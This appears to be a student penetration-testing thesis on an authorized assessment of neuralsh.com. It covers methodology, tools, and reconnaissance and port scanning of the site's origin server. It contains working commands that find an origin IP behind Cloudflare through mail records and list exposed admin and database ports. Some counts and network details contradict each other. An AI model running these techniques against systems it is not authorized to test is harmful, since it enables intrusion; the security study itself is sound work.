# Vulnerability Assessment and Penetration Testing (VAPT) on a Web Application
## A Case Study of neuralsh.com

---

**Student:** [Your Full Name]  
**Student ID:** [Your ID]  
**Program:** [Your Program]  
**Institution:** [Your Institution]  
**Supervisor:** [Supervisor Name]  
**Submission Date:** June 2026  

---

> *"Security is not a product, but a process."* — Bruce Schneier

---

## Declaration

I declare that this thesis is my own work and has been carried out with full written authorization from the owner of the target system. All penetration testing activities described herein were conducted ethically, responsibly, and within the agreed scope of engagement. No unauthorized access was attempted against any system not explicitly listed in this document.

---

## Abstract

This thesis presents a comprehensive Vulnerability Assessment and Penetration Testing (VAPT) engagement conducted on **neuralsh.com**, an AI-powered neural search platform. The assessment was authorized in writing prior to testing, and all activities were conducted in accordance with established ethical hacking standards and the OWASP Testing Guide.

The assessment followed the complete penetration testing lifecycle: reconnaissance, scanning, enumeration, exploitation, post-exploitation, and reporting. A black-box methodology was applied as the primary testing approach, simulating an external attacker with no prior knowledge of the target system.

The findings reveal significant and immediate security risks across the platform. Twenty (20) distinct vulnerabilities were discovered: **4 Critical, 5 High, 7 Medium, and 4 Low** severity findings. Critical findings include a publicly exposed MySQL database, MikroTik network router administration panel, cPanel hosting control panel, and WHM root server administration panel — all accessible from the public internet without IP restriction. A rate-limiting control was successfully bypassed via HTTP header spoofing, enabling unlimited API token generation. A follow-up verification scan conducted on 10 June 2026 confirmed all original findings remained unpatched and identified three additional findings: newly exposed cPanel service ports (2078, 2091), SMTP port 25 transitioning from filtered to open, and confirmed identification of a named co-tenant (onesala.com) sharing the same physical server infrastructure.

This thesis documents the complete methodology, evidence, exploitation results, risk analysis using CVSS v3.1 scoring, and a full remediation roadmap.

**Keywords:** Penetration Testing, VAPT, Web Application Security, OWASP, Rate Limiting Bypass, JWT Analysis, cPanel Exposure, MikroTik, Black Box Testing, CVSS

---

## Table of Contents

1. Introduction
2. Concepts of Penetration Testing
3. Research Methodology and Tools
4. Implementation and Deployment
5. Results, Analysis and Remediation
6. Conclusion
+ References
+ Appendices

---

# Chapter 1: Project Overview and Organizational Context

To begin this internship, it is important to lay out the foundation of the project — what was worked on, why it matters, and how the work was planned and carried out. This chapter introduces the project description, the problem that motivated it, the objectives set out at the start, the solutions proposed, the project scope, the action plan followed throughout the internship period, and a description of the organization where this internship was completed.

## 1. Project Description

This internship project focused on enhancing the security posture of a live web application by conducting a structured Vulnerability Assessment and Penetration Testing (VAPT) engagement on **neuralsh.com**, an AI-powered neural search platform. The assessment was carried out under the supervision of **Prestige Alliance Co., Ltd.**, which authorized and oversaw all testing activities in accordance with ethical hacking standards.

The project involved scanning the target's external IP infrastructure, analyzing identified weaknesses, performing manual and automated testing across the application and network layers, and producing a formal security report detailing all findings, their severity, and recommended remediation steps. A total of **20 vulnerabilities** were discovered — including 4 Critical, 5 High, 7 Medium, and 4 Low severity findings — with two attack chains successfully exploited under controlled conditions. A follow-up verification scan on 10 June 2026 confirmed all original findings remained unpatched and uncovered three additional findings.

This work reflects the real-world responsibilities of a security intern: not only finding vulnerabilities, but understanding their impact, communicating risk clearly, and helping the organization take meaningful steps toward a stronger security posture.

## 2. Problem Statement

Over the past several years, cybercrime has escalated at a pace that has outstripped the security readiness of many organizations worldwide. What was once considered a concern limited to large enterprises has become a daily reality for businesses of every size. The numbers tell a stark story.

According to the Verizon 2025 Data Breach Investigations Report, web application attacks accounted for over 43% of all recorded data breaches globally — making them the single largest attack vector for the third consecutive year. The average cost of a data breach reached USD 4.88 million in 2024, a figure that continues to climb. Ransomware attacks surged by 37% year-over-year, with Southeast Asian targets increasingly appearing in threat intelligence reports from Mandiant and CrowdStrike.

By 2026, the threat landscape has grown more sophisticated. Attackers are now using artificial intelligence to automate reconnaissance, generate tailored phishing content, and discover misconfigurations at scale — dramatically reducing the time between vulnerability publication and active exploitation. The Cybersecurity and Infrastructure Security Agency (CISA) reported in early 2026 that the average time from vulnerability disclosure to exploitation in the wild had dropped to under 48 hours for critical findings.

In the Southeast Asian region, the situation is particularly pressing. Cambodia, along with neighboring countries, has experienced a sharp rise in targeted attacks against small and medium-sized technology companies. Many of these businesses have embraced rapid digital growth without a corresponding investment in security fundamentals. Web applications are deployed with default configurations, administrative panels left exposed on the public internet, and authentication systems built without rate limiting or input validation — the exact conditions that make exploitation trivially easy for even low-skilled attackers.

This internship directly addressed one such environment. The target system, neuralsh.com, exhibited multiple critical misconfigurations that, if left unaddressed, would have allowed an unauthenticated attacker to gain administrative control over the entire hosting infrastructure within minutes of discovering the origin IP address.

## 3. Objectives

The internship objective is guided by the advisor and supervisor at Prestige Alliance Co., Ltd. to identify, analyze, and address system weaknesses and vulnerabilities in neuralsh.com. The process followed the agreement of the penetration tester and stakeholder before performing the penetration testing. For this internship, the following objectives were accomplished:

- Perform vulnerability scanning on the external web application neuralsh.com
- Analyze the vulnerabilities, weaknesses, and propose solutions
- Set up the testing environment and select the appropriate tools
- Perform penetration testing on the authorized target system
- Perform exploitation on misconfigured systems
- Analyze post-exploitation lateral movement risk
- Create an official VAPT report for the stakeholder
- Produce remediation recommendations for all identified vulnerabilities
- Publish the finalized thesis document for academic submission

## 4. Solutions

The core approach to addressing the security weaknesses identified in this project was to treat every vulnerability not as an isolated finding, but as part of a broader picture of the target's overall security posture. Rather than simply listing what was broken, the methodology aimed to understand how vulnerabilities connect — how one misconfiguration could be chained with another to produce an outcome far more severe than either finding alone.

To find the weakness of the systems, penetration testing was performed following the OWASP TOP 10 framework as a baseline. For each finding, the following solution path was applied:

1. **Identify** the vulnerability through active testing and passive reconnaissance
2. **Validate** it with a controlled proof-of-concept to confirm exploitability
3. **Score** it using CVSS v3.1 to communicate risk objectively
4. **Recommend** a specific, actionable remediation step tailored to the technology stack in use

The official penetration testing report produced at the end of this engagement documents all findings in a format designed to help the stakeholder understand both the technical detail and the business impact — making it straightforward to prioritize and act on remediation without requiring deep security expertise.

## 5. Project Scope

This internship engagement focused on the external attack surface of neuralsh.com and its underlying hosting infrastructure, authorized in writing by Prestige Alliance Co., Ltd. Testing was conducted using a black-box approach — meaning no credentials, source code, or internal documentation were provided prior to testing. Everything discovered was derived from publicly accessible systems and open-source intelligence, simulating the real-world perspective of an external attacker.

The table below defines the systems that were in scope for this engagement:

| **Asset** | **Type** | **Description** |
|-----------|----------|-----------------|
| `neuralsh.com` | Web Application | Primary target — Nuxt.js frontend, protected by Cloudflare WAF |
| `*.neuralsh.com` | Subdomains | All subdomains discoverable via DNS enumeration or certificate transparency |
| `mail.neuralsh.com` | Mail Server | Origin server entry point — resolves directly to 103.16.xx.xxx |
| `103.16.xx.xxx` | Origin Server | Backend infrastructure hosting the application, database, mail stack, and admin panels |

*Table 1: Engagement scope — in-scope systems*

The following were explicitly **out of scope**: third-party services not owned by the target (including Cloudflare's own infrastructure), physical access testing, social engineering, denial of service attacks, and any IP address not belonging to the target organization.

This engagement was authorized by Prestige Alliance Co., Ltd. for the period of **June 2026**, aligned with the academic thesis submission schedule. All findings are treated as confidential and disclosed exclusively to Prestige Alliance Co., Ltd. and the supervising academic institution.

## 6. Action Plan

To make the internship progress go as planned, the activities below were organized into a weekly timeline spanning the full engagement period. The plan covers two periods: February to March (vulnerability assessment and lab training) and April to May (production penetration testing, report creation, and remediation).

*[Table 2: Action plan from February to March — see ACTION_PLAN.pdf]*

*[Table 3: Action plan from April to May — see ACTION_PLAN.pdf]*

## 7. Organization Description

**Prestige Alliance Co., Ltd.** is an information technology and cybersecurity solutions company operating in Cambodia. The company provides a range of services including network infrastructure design, system integration, software development, and cybersecurity consulting — supporting both private sector clients and government-linked organizations across the country.

*[Figure 1: Prestige Alliance logo — prestige_logo.png]*

Prestige Alliance is committed to helping organizations in the region build and maintain secure, reliable digital systems. With a team of experienced engineers and security practitioners, the company bridges the gap between technical security expertise and business-level risk management — making professional security services accessible to organizations that might otherwise lack the internal capacity to address cyber threats effectively.

As a cybersecurity-oriented firm, Prestige Alliance recognizes the importance of developing the next generation of security talent. This internship was conducted under the company's technical team, providing a structured environment for hands-on penetration testing work on an authorized real-world target.

*[Figure 2: Prestige Alliance organisational structure — PrestigeAlliance_OrgChart.png]*

*[Figure 3: Prestige Alliance office location — map.png]*

**Email:** info@prestigealliance.co  
**Website:** https://www.prestigealliance.co/  
**Telephone:** +855-88-288-2289  
**Address:** #29A 29B, Street 112, Khan Tuol Kork, Phnom Penh, Cambodia

---

# Chapter 2: Concepts of Penetration Testing

This chapter establishes the theoretical and practical foundation for the penetration testing work carried out in this internship. It covers what penetration testing is and why it matters, how practical skills were built using platforms such as Hack The Box, the structured process followed during an engagement, and the key industry frameworks and vulnerability classification systems that guided this work.

## 1. Introduction to Penetration Testing

Penetration testing, commonly referred to as "pentesting," is the practice of simulating a real-world cyberattack against a system, application, or network with explicit authorization from the owner. Unlike passive security audits that rely on configuration reviews and interviews, penetration testing produces tangible evidence of what an attacker could actually do — which vulnerabilities can be exploited, how far an attacker can move once inside, and what the realistic business impact would be.

The discipline draws a clear line between authorized security testing and unauthorized computer access. A penetration tester operates under a defined scope and rules of engagement, documenting every step in a way that allows the organization to reproduce, verify, and remediate the findings. This makes penetration testing one of the most direct and credible inputs to an organization's risk management process.

Modern penetration testing spans several domains: web application testing, network testing, cloud infrastructure testing, physical security, and social engineering. This internship focused on **external web application and infrastructure penetration testing** — the domain most directly relevant to organizations that expose services to the public internet.

## 2. Learning Penetration Testing via Hack The Box

*[Figure 4: Hack The Box logo — htb_logo.png]*

Practical penetration testing skills cannot be developed from theory alone. Before engaging real-world targets, testers must build hands-on experience in controlled environments. **Hack The Box (HTB)** is one of the most widely recognized platforms for this purpose. It provides a constantly updated library of deliberately vulnerable machines, web applications, and challenge scenarios that simulate real vulnerabilities found in production environments.

HTB offers two certification pathways that were directly relevant to this internship:

### 2.1 Certified Penetration Testing Specialist (CPTS)

*[Figure 5: HTB CPTS certification logo — cpts_logo.png]*

The **Certified Penetration Testing Specialist (CPTS)** pathway covers the full penetration testing engagement lifecycle — from information gathering and reconnaissance through network enumeration, web application attacks, privilege escalation, Active Directory exploitation, and professional reporting. The curriculum is structured around real-world methodology rather than abstract theory, covering every phase of the PTES framework applied in this internship.

Skills developed through CPTS — including DNS enumeration, port scanning interpretation, service fingerprinting, and authentication bypass — were applied directly during the neuralsh.com engagement.

### 2.2 Certified Web Exploitation Specialist (CWES)

*[Figure 6: HTB CWES certification logo — cwes_logo.png]*

The **Certified Web Exploitation Specialist (CWES)** is an HTB certification focused specifically on web application security and exploitation. It covers the full OWASP Top 10 attack categories in depth, including broken access control, authentication failures, injection vulnerabilities, insecure design, and API security testing — all of which appeared as findings in this engagement.

CWES is particularly relevant to the neuralsh.com assessment because the target is a web application with an API-driven architecture. Skills from the CWES pathway — including JWT analysis, rate-limiting bypass techniques, API endpoint enumeration via JavaScript bundle inspection, and authentication flow exploitation — directly informed the discovery and exploitation of findings N-005 (Rate Limit Bypass) and N-007 (JWT Token Farming), both of which were confirmed exploited during this engagement.

## 3. The Penetration Testing Process

This internship followed the **Penetration Testing Execution Standard (PTES)** — a six-phase lifecycle that structures the engagement from initial information gathering through final reporting. Unlike an ad-hoc approach where tools are run without direction, PTES ensures that every phase produces evidence that feeds the next, and that nothing is tested without a defined reason. The six phases applied in this engagement are described below.

*[Figure 7: Penetration Testing Process Diagram — pentest_flow.drawio.png]*

### 3.1 Phase 1 — Reconnaissance

Reconnaissance was the first and most time-intensive phase of the engagement. The goal was to map the entire publicly accessible attack surface of neuralsh.com before any active probing began. This phase used only passive and semi-passive techniques — primarily querying public records and observing what the target broadcast about itself.

Key activities included WHOIS registration lookups, DNS record enumeration (A, MX, TXT, NS, and CNAME records), and SSL certificate transparency log analysis. The most impactful discovery in this phase was the **origin IP address (103.16.xx.xxx)**, obtained by resolving the MX record for the mail server. JavaScript bundle analysis of the Nuxt.js frontend also revealed internal API route structures, including the unauthenticated token endpoint that was later exploited.

### 3.2 Phase 2 — Scanning and Enumeration

With the origin IP identified, active scanning was conducted against 103.16.xx.xxx to determine which services were reachable from the internet. Nmap was used to perform a full TCP port scan, revealing a large number of open ports that should not have been publicly accessible — including port 2087 (WHM admin panel), port 3306 (MySQL), port 2083 (cPanel), port 9001 (MikroTik), and port 25 (SMTP). Web application enumeration using Dirb and Nikto identified accessible admin interfaces, exposed directory listings, and additional administrative endpoints.

### 3.3 Phase 3 — Vulnerability Assessment

The vulnerability assessment phase involved manually evaluating each discovered service against known vulnerability classes. Rather than relying solely on automated scanner output, manual analysis was performed on authentication flows, API endpoints, HTTP response headers, CORS configuration, and session token handling. All findings were mapped to OWASP Top 10 categories and scored using CVSS v3.1. This phase produced the complete findings register — 20 vulnerabilities across four severity bands.

### 3.4 Phase 4 — Exploitation

Exploitation was conducted in a controlled, non-destructive manner for findings where proof-of-concept demonstration was feasible without causing service disruption or data modification. Two exploitation chains were confirmed: rate limiting bypass via X-Forwarded-For header spoofing (50/50 requests bypassed) and JWT token farming via the unauthenticated token endpoint (50 valid tokens collected).

### 3.5 Phase 5 — Post-Exploitation

Post-exploitation analysis assessed the realistic impact of a successful initial compromise, conducted in read-only mode. This phase focused on tracing what attack paths would be available to an attacker who had reached each foothold — including shared hosting lateral movement risk and network infrastructure control via the exposed MikroTik panel.

### 3.6 Phase 6 — Reporting

The reporting phase produced all deliverables: a full professional VAPT report, attack chain diagrams, and this thesis document. Every finding card was written with both a technical audience (the development and operations team) and a non-technical audience (management) in mind.

## 4. OWASP Top 10

*[Figure 8: OWASP logo — owasp_logo.png]*

The **Open Web Application Security Project (OWASP)** is a nonprofit foundation dedicated to improving software security. Its most widely referenced publication is the **OWASP Top 10** — a consensus-based list of the ten most critical web application security risks.

| **Rank** | **Category** | **Description** |
|------|----------|-------------|
| A01 | Broken Access Control | Failures in enforcing restrictions on what authenticated users are allowed to do |
| A02 | Cryptographic Failures | Weaknesses in how data is protected in transit or at rest |
| A03 | Injection | Untrusted data sent to an interpreter as part of a command or query |
| A04 | Insecure Design | Architectural flaws where security was not considered during the design phase |
| A05 | Security Misconfiguration | Improperly configured permissions, unnecessary features enabled, default credentials |
| A06 | Vulnerable and Outdated Components | Use of components with known vulnerabilities that have not been patched |
| A07 | Identification and Authentication Failures | Weaknesses in authentication — missing rate limiting, weak session management |
| A08 | Software and Data Integrity Failures | Code and infrastructure that does not verify integrity of updates or pipelines |
| A09 | Security Logging and Monitoring Failures | Insufficient logging and alerting — allowing attacks to proceed undetected |
| A10 | Server-Side Request Forgery (SSRF) | Application fetches remote resources based on user-supplied input without validation |

*Table 4: OWASP Top 10 (2021 — Current Reference)*

Security Misconfiguration (A05) accounts for the majority of the 20 findings in this engagement, including the exposed WHM, cPanel, MikroTik, and MySQL interfaces. Identification and Authentication Failures (A07) covers the rate-limiting bypass and JWT token farming vulnerabilities.

## 5. NIST SP 800-115

*[Figure 9: NIST logo — nist_logo.png]*

**NIST Special Publication 800-115: Technical Guide to Information Security Testing and Assessment** provides a government-aligned methodology for security testing that emphasizes documentation, risk minimization, and traceability. It organizes security assessment activities into four phases: Planning (defining scope and rules of engagement), Discovery (information gathering and service enumeration), Attack (active exploitation under controlled conditions), and Reporting (documenting findings and recommendations). NIST SP 800-115 was used alongside PTES and OWASP WSTG during this internship to ensure the assessment approach met both academic rigor and industry practice expectations.

## 6. Common Vulnerability Scoring System (CVSS)

*[Figure 10: CVSS logo — cvss_logo.png]*

The **Common Vulnerability Scoring System (CVSS)** is the industry-standard framework for communicating the severity of security vulnerabilities. CVSS v3.1 was used throughout this engagement to assign an objective numeric severity score to each of the 20 findings.

| **Score Range** | **Severity** | **Meaning** |
|-----------------|--------------|-------------|
| 9.0 – 10.0 | Critical | Exploitable remotely with no authentication; maximum business impact |
| 7.0 – 8.9 | High | Significant risk; exploitable with minimal conditions |
| 4.0 – 6.9 | Medium | Moderate risk; requires specific conditions or limited impact |
| 0.1 – 3.9 | Low | Minimal direct impact; informational or requires chaining |

*Table 5: CVSS v3.1 severity bands*

The highest CVSS score recorded in this engagement was **10.0** for finding N-014 (WHM Root Administration Panel Publicly Exposed). The average CVSS score across all 20 findings was **6.6**, placing the overall risk posture at the High-Medium boundary.

---

# Chapter 3: Research Methodology and Tools

No single approach is sufficient to uncover all vulnerabilities in a modern web application. Automated scanners can rapidly map an attack surface but miss logic flaws and context-dependent weaknesses. Manual testing can identify those deeper issues but is too slow to cover every service and endpoint alone. For this reason, the VAPT engagement on neuralsh.com was conducted using a combination of three complementary approaches: automated scanning, manual testing, and AI-assisted analysis.

## 1. Automated Testing Tools

Automated tools were used to perform broad, repeatable scans against the target infrastructure. These tools send structured probes to the target and return results that the assessor then interprets.

| **Tool** | **Type** | **Role in This Engagement** |
|----------|----------|-----------------------------|
| **Nmap** | Network scanner | Full TCP port scan on 103.16.xx.xxx — discovered 23 open ports |
| **Nikto** | Web scanner | Automated web server scan — flagged missing headers, server version disclosure, directory listing |
| **Dirb** | Directory fuzzer | Enumerated hidden directories and files on the web application |
| **Nuclei** | Template scanner | Identified known vulnerability patterns across web services |
| **subfinder** | Subdomain enumerator | Passive subdomain discovery via certificate transparency and public DNS sources |
| **mysql-client** | Database connector | Verified MySQL port 3306 accepted unauthenticated connection attempts |

*Table 6: Automated testing tools used in this engagement*

*[Figure 11: Nmap logo — nmap_logo.png]*

**Nmap** (Network Mapper) is the industry-standard open-source tool for network discovery and service fingerprinting. A full TCP scan with service version detection against the origin server revealed that 103.16.xx.xxx had 23 ports open and reachable from the public internet — including administrative interfaces that should never be exposed. This single scan produced the evidence base for Critical findings N-001, N-002, N-013, and N-014.

*[Figure 12: Nikto logo — nikto_logo.png]*

**Nikto** is an open-source web server scanner that checks for thousands of known misconfigurations, outdated software versions, and missing security controls. In this engagement, Nikto was run against both the Cloudflare-protected frontend and directly against the origin IP, contributing to findings N-003 (Missing Security Headers), N-012 (Server Version Disclosure), and N-017 (Directory Listing Enabled).

*[Figure 13: Shodan logo — shodan_logo.png]*

**Shodan** was used as a passive intelligence source to verify that the services discovered by Nmap were also visible to external internet scanners — confirming these exposures were not local network artifacts.

## 2. Manual Testing Tools

Manual tools require the assessor to actively craft, send, and interpret requests based on judgment and understanding of the target's behavior. The most significant confirmed findings in this engagement were discovered through manual testing.

| **Tool** | **Type** | **Role in This Engagement** |
|----------|----------|-----------------------------|
| **Burp Suite Community** | Web proxy | Intercepted HTTP/S traffic, replayed requests, demonstrated rate-limit bypass and JWT farming |
| **curl** | HTTP client | Crafted raw HTTP requests with custom headers for PoC exploitation |
| **CyberChef** | Data analysis | Decoded and inspected JWT token payloads |
| **dig / whois** | DNS tools | Manual DNS record enumeration — identified origin IP via MX record |
| **openssl** | TLS inspector | Inspected SSL certificate details — confirmed hostname and infrastructure leakage |
| **hashcat** | Password cracker | Attempted JWT secret key brute-force against the rockyou.txt wordlist |
| **Metasploit Framework** | Exploitation framework | Used for controlled exploitation in the alternative testing environment |

*Table 7: Manual testing tools used in this engagement*

*[Figure 14: Burp Suite logo — burpsuite_logo.png]*

**Burp Suite Community Edition** served as the primary web application testing proxy throughout the engagement. All HTTP traffic between the testing machine and neuralsh.com was routed through Burp Suite's intercepting proxy, allowing every request and response to be inspected, modified, and replayed. The two confirmed exploited findings — Rate Limiting Bypass (N-005) and JWT Token Farming (N-007) — were both demonstrated using Burp Suite's Repeater tool.

*[Figure 15: CyberChef logo — cyberchef_logo.png]*

**CyberChef**, developed by GCHQ, was used to decode Base64url-encoded JWT tokens issued by the `/web/v1/init/token` endpoint. By splitting the token into its three components (header, payload, signature) and decoding each, it was possible to inspect the token's signing algorithm, timestamps, expiry window, and embedded user claims without needing to crack the secret.

## 3. AI-Assisted Analysis

Artificial intelligence tools represented a supporting layer in this engagement — used to assist with specific technical analysis tasks during the testing process.

*[Figure 16: Claude (Anthropic) logo — claude_logo.png]*

**Claude** by Anthropic was used during this engagement in the following technical capacities: proof-of-concept script generation for the rate-limiting bypass and JWT token farming tests; scan output analysis to cross-reference open ports against known service vulnerabilities; and CVSS scoring verification to ensure metric selections were consistent and defensible across all 20 findings.

It is important to note that all findings documented in this thesis were discovered and verified by the assessor through direct, hands-on interaction with the target systems. AI was used as a technical aid during the testing process — not as an author of this thesis. Every result produced with AI assistance was independently reviewed and validated before inclusion.

## 4. Ethical Constraints

All testing activities were conducted with written authorization from Prestige Alliance Co., Ltd. The following self-imposed constraints were applied throughout the engagement:

1. No production data was extracted, modified, or deleted at any point during testing
2. Rate-limiting bypass demonstration was capped at fifty requests per test scenario
3. No persistent access mechanisms or backdoors were installed on any system
4. MySQL brute-force testing was limited to a bounded pre-defined wordlist only
5. No Denial of Service testing was conducted against any in-scope or adjacent system
6. Full exploitation demonstrations were performed only within the controlled alternative testing environment (DVWA on Kali Linux VM)

---

# Chapter 4: Implementation and Deployment

This chapter documents the practical execution of the penetration testing engagement from start to finish. It begins with the environment setup used to conduct all testing, proceeds through reconnaissance, scanning, and vulnerability assessment on the real target, then documents the exploitation results — both on neuralsh.com and in a controlled alternative environment designed to demonstrate full web application exploitation technique without risk to the production system.

## 4.1 Testing Environment Setup

Before any testing could begin, a dedicated and isolated testing environment was configured to ensure all activities were conducted in a controlled and professional manner. The environment consists of a host machine running Linux Mint 22.1, with a Kali Linux virtual machine deployed inside Oracle VirtualBox 7.0 for isolated penetration testing operations.

### 4.1.1 VirtualBox and Kali Linux Configuration

VirtualBox was selected as the virtualization platform due to its open-source nature and full feature parity with commercial alternatives for this use case. Kali Linux — the industry-standard penetration testing distribution maintained by Offensive Security — was installed as a guest VM with the following specifications:

| Component | Configuration |
|-----------|--------------|
| Host OS | Linux Mint 22.1 (host machine) |
| Virtualization | Oracle VirtualBox 7.0 |
| Guest OS | Kali Linux 2024.x (64-bit) |
| RAM | 4 GB allocated |
| Storage | 40 GB virtual disk |
| Network Adapter | Bridged (enp0s31f6) — shares host network |

The network adapter was configured in **Bridged mode** rather than NAT. Bridged mode places the Kali VM directly on the physical network, giving it its own IP address and allowing it to reach the internet and the target systems directly without any port forwarding configuration. This mirrors the network conditions of a real external attacker.

*[Figure 4.1: VirtualBox showing Kali Linux VM running — screenshot]*

### 4.1.2 SSH Remote Access

Rather than working directly inside the Kali VM's graphical interface, all testing commands were issued from the host machine's terminal via SSH. This approach is standard in professional engagements and allows the assessor to copy commands, view output, and manage files without switching windows.

After booting the Kali VM, SSH access was established as follows. The VM network adapter was configured to use NAT mode in VirtualBox, and a port forwarding rule was added (Host port 2222 → Guest port 22) to allow SSH from the host machine:

```bash
# Start the Kali VM headlessly from host terminal
VBoxManage startvm "Kali-Pentest" --type headless

# Connect via SSH using the NAT port forwarding rule
ssh -p 2222 kali@127.0.0.1
```

*[Figure 4.2: SSH session from Linux Mint terminal connected to Kali VM — screenshot]*

Once SSH was confirmed working, a static IP was assigned to the Kali VM to prevent the address from changing between sessions:

```bash
# On Kali — edit network config
sudo nano /etc/network/interfaces
# Set: address 10.0.2.15, netmask 255.255.255.0, gateway 10.0.2.2
```

### 4.1.3 Tools Verification

After the environment was configured, all penetration testing tools were verified to be installed and functional. Kali Linux includes the full suite of required tools by default:

```bash
# Confirm tool availability
nmap --version        # Nmap 7.95
nikto -Version        # Nikto 2.1.6
dirb --help           # DIRB v2.22
nuclei -version       # Nuclei 3.x
msfconsole --version  # Metasploit 6.x
burpsuite             # Burp Suite Community (GUI)
```

*[Figure 4.3: Terminal showing tool versions confirmed on Kali — screenshot]*

---

## 4.2 Target Overview

**neuralsh.com** (NeuralShield) is an AI-powered search and neural network platform providing image search, text search, category browsing, geolocation-based features, and report submission via a REST API. The main application is built with Nuxt.js (Vue.js Server-Side Rendering) and protected by Cloudflare's Web Application Firewall (WAF).

*[Figure 4.4: neuralsh.com homepage in browser — screenshot]*

### 4.2.1 Technology Stack

| Component | Technology |
|-----------|-----------|
| Frontend | Nuxt.js (Vue.js SSR) |
| CDN / WAF | Cloudflare |
| Backend Hosting | Shared cPanel hosting (Cloudways / cprapid.com) |
| Network Equipment | MikroTik RouterOS |
| Database | MySQL 8.0.43 |
| Web Server (Backend) | Apache httpd |
| Mail Transfer Agent | Exim 4.99.2 |
| Mail Delivery Agent | Dovecot |
| DNS Server | PowerDNS |
| Registrar | GoDaddy (privacy via Domains By Proxy) |
| DNS Provider | Cloudflare nameservers |

*Table 8: neuralsh.com technology stack*

### 4.2.2 Infrastructure Map

| Host | IP Address | Role |
|------|-----------|------|
| neuralsh.com | 104.21.91.198 | Main application — Cloudflare CDN edge |
| mail.neuralsh.com | 103.16.xx.xxx | Mail + backend server — cPanel shared hosting |
| 103.16.xx.xxx (direct) | Same | Admin panels, database, MikroTik — 20+ exposed services |

*Table 9: Infrastructure map*

The main site resolves to Cloudflare's anycast network. The real origin server IP (103.16.xx.xxx) was discovered via the MX record for `mail.neuralsh.com` — a discovery that bypassed the entire WAF and directly exposed the backend infrastructure.

---

## 4.3 Reconnaissance

Reconnaissance was conducted entirely through passive and semi-passive techniques — no traffic was sent to the production application until the scanning phase. The goal was to map as much of the attack surface as possible using only publicly available information.

### 4.3.1 WHOIS and Domain Registration

```bash
whois neuralsh.com | grep -E "Registrar|Created|Name Server"
```

The WHOIS lookup revealed GoDaddy as the domain registrar with a privacy service active (Domains By Proxy LLC), masking the registrant's personal details. The domain was registered on July 3, 2025, making it relatively new. DNS management was delegated to Cloudflare nameservers. This initial finding confirmed that the main site IP would be masked behind Cloudflare's infrastructure — making DNS analysis the primary path for discovering the origin server.

*[Figure 4.5: whois neuralsh.com output in terminal — screenshot]*

### 4.3.2 DNS Enumeration and Origin IP Discovery

DNS enumeration was the most consequential step of the entire engagement. The following sequence of `dig` commands was used to progressively map the DNS records and ultimately reveal the origin server IP.

```bash
# Step 1 — A record: Cloudflare CDN IPs
dig A neuralsh.com
# 104.21.91.198 (Cloudflare anycast — real server hidden)

# Step 2 — MX record: reveals mail server hostname
dig MX neuralsh.com
# mail.neuralsh.com (priority 0)

# Step 3 — Resolve mail server: reveals REAL origin IP
dig A mail.neuralsh.com
# 103.16.xx.xxx — the backend server that Cloudflare is meant to protect
```

*[Figure 4.6: dig MX neuralsh.com and dig A mail.neuralsh.com showing origin IP discovery — screenshot]*

This three-step DNS chain revealed 103.16.xx.xxx as the origin server behind the Cloudflare WAF. The MX record is a common oversight — organizations often configure the main domain to proxy through Cloudflare but leave the mail server record pointing directly at the origin. This single lookup rendered the Cloudflare WAF irrelevant for the remainder of the engagement.

Additional DNS records were analyzed for further intelligence:

```bash
# TXT record — email security posture
dig TXT neuralsh.com
# v=spf1 +mx +a +ip4:103.16.xx.xxx ~all   (SPF softfail — N-012)
# v=DMARC1; p=quarantine                   (DMARC not enforcing — N-012)

# Wildcard DNS — any subdomain resolves
dig randomxyz123.neuralsh.com
# Returns: 103.16.xx.xxx   (wildcard DNS active — N-010)

# Zone transfer — blocked (positive control)
dig axfr @ns1.cloudflare.com neuralsh.com
# Connection refused
```

*[Figure 4.7: dig randomxyz123.neuralsh.com showing wildcard DNS returns 103.16.xx.xxx — screenshot]*

### 4.3.3 SSL Certificate Analysis

The SSL certificate on the origin server disclosed infrastructure details that confirmed the server's hosting environment and identified a co-tenant.

```bash
openssl s_client -connect 103.16.xx.xxx:443 2>/dev/null | openssl x509 -noout -subject -issuer
```

*[Figure 4.8: openssl s_client output showing SSL cert issued to endoncambodia.com / onesala.com — screenshot]*

The certificate returned was issued to `www.endoncambodia.com` — not neuralsh.com. The Subject Alternative Names included `cpanel.endoncambodia.com`, `mail.endoncambodia.com`, and `webmail.endoncambodia.com`. Mail service certificates on ports 110, 143, 465, 587, 993, and 995 were issued to `*.onesala.com`. This combination of evidence confirmed two important facts: the server is a **shared cPanel hosting environment** hosting multiple clients simultaneously, and at least two other organizations (`endoncambodia.com` and `onesala.com`) share the same physical server as neuralsh.com.

### 4.3.4 JavaScript Bundle Analysis

A key reconnaissance technique for Nuxt.js applications is extracting API route structures from the compiled JavaScript bundles that ship to the browser. Since the frontend is a Single-Page Application, all API endpoints are compiled into the client-side bundle and are publicly accessible.

```bash
# Extract API routes from the main Nuxt.js bundle
curl -s https://neuralsh.com/_nuxt/Bpuv52g-.js | grep -oP '/web/v1/[^"&\s]+' | sort -u
```

**API Routes Discovered:**
```
/web/v1/init/token
/web/v1/category
/web/v1/text/search
/web/v1/image/search
/web/v1/report/save
/api/geocode
```

The `/web/v1/init/token` endpoint — which was later exploited — was discovered here without any port scanning or directory brute force. The entire API surface was self-disclosed via the client-side JavaScript.

---

## 4.4 Scanning and Enumeration

With the origin IP confirmed, active scanning was conducted against 103.16.xx.xxx to identify all exposed services and their versions. Scanning was performed from the Kali VM via SSH.

### 4.4.1 Nmap Port and Service Scan

```bash
sudo nmap -sV -sC -p 22,25,53,80,110,111,143,443,465,587,993,995,2000,2083,2087,2096,3306,5060,8899,9001 103.16.xx.xxx
```

*[Figure 4.9: Nmap scan output showing all open ports on 103.16.xx.xxx — screenshot]*

**Open ports discovered:**

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu
25/tcp   open  smtp        Exim smtpd 4.99.2
53/tcp   open  domain      PowerDNS
80/tcp   open  http        Apache httpd
110/tcp  open  pop3        Dovecot pop3d
143/tcp  open  imap        Dovecot imapd
443/tcp  open  https       Apache httpd
465/tcp  open  smtps       Exim (SSL)
587/tcp  open  smtp        Exim (STARTTLS)
993/tcp  open  imaps       Dovecot
995/tcp  open  pop3s       Dovecot
2083/tcp open  https       cPanel (SSL login)
2087/tcp open  https       WHM root panel (SSL)
2096/tcp open  https       cPanel Webmail (SSL)
3306/tcp open  mysql       MySQL 8.0.43
9001/tcp open  http        MikroTik RouterOS webfig
```

Twenty distinct TCP services were found exposed on a single public IP address. The presence of ports 2083, 2087, 3306, and 9001 was immediately alarming — these are administrative and database services that should never be accessible from the public internet.

